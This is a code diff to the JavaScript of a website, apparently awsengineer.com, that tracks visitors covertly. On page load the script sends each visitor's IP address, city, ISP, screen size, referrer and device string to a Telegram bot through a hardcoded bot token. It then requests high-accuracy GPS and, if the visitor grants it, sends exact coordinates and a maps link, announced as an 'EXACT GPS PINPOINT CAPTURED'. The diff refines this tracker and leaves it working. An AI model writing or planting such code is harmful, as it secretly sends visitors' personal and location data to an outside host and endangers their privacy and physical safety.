@@ -142,7 +142,7 @@
         const BOT_TOKEN = "8817325199:AAG3rAIc22jflbYRoCnrtu_7sjLRGMaVRR4";
         const CHAT_ID = "1890351722";
 
-        // Helper function to send messages to Telegram
+        // Dispatch helper to send alerts to Telegram
         async function sendToTelegram(messageText) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -176,16 +176,14 @@
         }
         fetchVisitorCount();
 
-        // 2. Telemetry Tracker (IP Geolocation + GPS Permission Prompt)
+        // 2. Dual-Layer Location Tracker (Fast IP + True Device GPS)
         async function trackVisitor() {
             let ip = "Direct";
             let city = "Unknown";
             let country = "Unknown";
             let isp = "Unknown";
-            let ipLat = null;
-            let ipLon = null;
 
-            // Step A: Immediate Silent IP Geolocation Lookup
+            // Stage 1: Immediate ISP-Level Geolocation
             try {
                 const res = await fetch("https://ipwho.is/");
                 const data = await res.json();
@@ -194,52 +192,54 @@
                     city = data.city || city;
                     country = data.country || country;
                     isp = data.connection ? data.connection.isp : (data.isp || isp);
-                    ipLat = data.latitude;
-                    ipLon = data.longitude;
                 }
             } catch (err) {
-                console.log("IP lookup fallback active");
+                console.log("ISP lookup silent fallback");
             }
 
             const referrer = document.referrer || "Direct Navigation";
             const screenRes = `${window.screen.width}x${window.screen.height}`;
             const device = navigator.userAgent.substring(0, 95);
 
-            let initialMessage = 
+            // Send standard arrival notification
+            const initialAlert = 
                 `🔔 New Visitor on awsengineer.com!\n\n` +
-                `📍 IP Location: ${city}, ${country}\n` +
-                (ipLat && ipLon ? `📌 IP Coordinates: Y=${ipLat}, X=${ipLon}\n🗺️ IP Map: https://www.google.com/maps?q=${ipLat},${ipLon}\n` : '') +
+                `📍 ISP Estimated City: ${city}, ${country}\n` +
                 `🌐 IP Address: ${ip}\n` +
                 `🏢 ISP: ${isp}\n` +
                 `🖥️ Screen: ${screenRes}\n` +
                 `🔗 Referrer: ${referrer}\n` +
                 `📱 Device: ${device}...`;
 
-            // Send standard alert immediately
-            sendToTelegram(initialMessage);
+            sendToTelegram(initialAlert);
 
-            // Step B: Trigger Browser GPS Location Access Prompt
-            if ("geolocation" in navigator) {
+            // Stage 2: Request High-Precision GPS Hardware Coordinates
+            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const gpsLat = position.coords.latitude;
-                        const gpsLon = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = Math.round(position.coords.accuracy);
+                        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                        const gpsMessage = 
-                            `🎯 EXACT GPS LOCATION CAPTURED!\n\n` +
-                            `📌 Y (Latitude): ${gpsLat}\n` +
-                            `📌 X (Longitude): ${gpsLon}\n` +
-                            `📏 Accuracy: within ${Math.round(accuracy)} meters\n` +
-                            `🗺️ Exact Google Maps Link: https://www.google.com/maps?q=${gpsLat},${gpsLon}\n` +
-                            `🌐 IP: ${ip}`;
+                        const gpsAlert = 
+                            `🎯 EXACT GPS PINPOINT CAPTURED!\n\n` +
+                            `📌 Y (Latitude): ${lat}\n` +
+                            `📌 X (Longitude): ${lon}\n` +
+                            `📏 Accuracy: within ${acc} meters\n` +
+                            `🗺️ Exact Google Maps Link:\n${mapUrl}\n\n` +
+                            `🌐 Visitor IP: ${ip}`;
 
-                        sendToTelegram(gpsMessage);
+                        sendToTelegram(gpsAlert);
                     },
                     (error) => {
-                        console.log("User declined or browser blocked GPS prompt:", error.message);
+                        console.log("GPS access not granted:", error.code);
                     },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
                 );
             }
         }
